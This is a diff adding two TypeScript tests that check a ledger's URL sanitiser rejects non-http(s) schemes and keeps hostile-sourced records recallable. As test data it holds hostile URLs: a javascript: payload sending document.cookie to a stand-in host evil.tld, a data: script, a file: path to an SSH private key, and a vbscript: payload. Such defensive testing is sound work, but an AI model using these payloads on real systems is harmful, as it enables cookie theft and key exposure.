@@ -1,7 +1,7 @@
 import assert from "node:assert/strict";
 import { randomUUID } from "node:crypto";
 import {
-	chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, statSync, truncateSync, writeFileSync,
+	chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, truncateSync, writeFileSync,
 } from "node:fs";
 import { appendFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
@@ -458,5 +458,52 @@ test("a successful note resets the refusal streak — only CONSECUTIVE failures 
 		if (prevBin === undefined) delete process.env.KETCH_BIN; else process.env.KETCH_BIN = prevBin;
 		if (prevAgent === undefined) delete process.env.PI_CODING_AGENT_DIR; else process.env.PI_CODING_AGENT_DIR = prevAgent;
 		resetPiGlobals();
+	}
+});
+
+test("storedUrl fails closed to http(s) — the writer is never more permissive than the reader", () => {
+	// javascript:/data:/file: parse fine as URLs, so "it parsed" admitted payloads
+	// the reader (validStoredUrl) then rejected: rows that could be written but
+	// never recalled. Reachable via a hostile claimed_source.
+	for (const hostile of [
+		"javascript:fetch('https://evil.tld/?c='+document.cookie)",
+		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+		"file:///Users/victim/.ssh/id_rsa",
+		"vbscript:msgbox(1)",
+	]) {
+		const stored = storedUrl(hostile);
+		assert.equal(stored.display, "[invalid-url]", `${hostile} must not be persisted verbatim`);
+		assert.ok(!stored.display.includes("evil.tld") && !stored.display.includes("id_rsa"));
+	}
+	// Opposite polarity: ordinary web URLs are unchanged, query/fragment stripped.
+	const ok = storedUrl("https://example.com/a/b?token=secret#frag");
+	assert.equal(ok.display, "https://example.com/a/b");
+	assert.equal(ok.query_removed, true);
+	assert.equal(storedUrl("http://example.com/x").display, "http://example.com/x");
+});
+
+test("a hostile claimed_source round-trips: written AND recallable, never a write-only record", async () => {
+	// The asymmetry this closes: the writer accepted any parseable scheme while
+	// the reader admitted only http(s), so a record with a javascript: claimed
+	// source was written to disk and then silently dropped by recall — and
+	// recall folds validation drops into the same counter as budget trims, so
+	// an armed round could lose every record invisibly.
+	const root = mkdtempSync(join(tmpdir(), "ledger-scheme-"));
+	try {
+		const agent = join(root, "agent");
+		const project = join(root, "project");
+		const path = ledgerPath(project, randomUUID(), { PI_CODING_AGENT_DIR: agent } as NodeJS.ProcessEnv);
+		const page = { text: "x", sha256: sha256Hex("x"), fetchedAt: "2026-08-10T10:00:00Z" };
+		await appendToLedger(path, researchRecord(1, "a claim", "https://example.com/real", "evidence", page,
+			"javascript:fetch('https://evil.tld/?c='+document.cookie)", "2026-08-10T10:01:00Z"));
+		const recalled = await recallLedger(path, 1);
+		assert.equal(recalled.shown, 1, "the record must survive recall, not vanish");
+		assert.equal(recalled.omitted, 0, "a dropped record would hide here, pooled with budget trims");
+		assert.ok(recalled.text.includes("[invalid-url]"), "the hostile scheme is neutralized, not persisted verbatim");
+		assert.ok(!recalled.text.includes("evil.tld"));
+		// ...and the persisted bytes never contained the payload either.
+		assert.ok(!readFileSync(path, "utf8").includes("evil.tld"));
+	} finally {
+		rmSync(root, { recursive: true, force: true });
 	}
 });
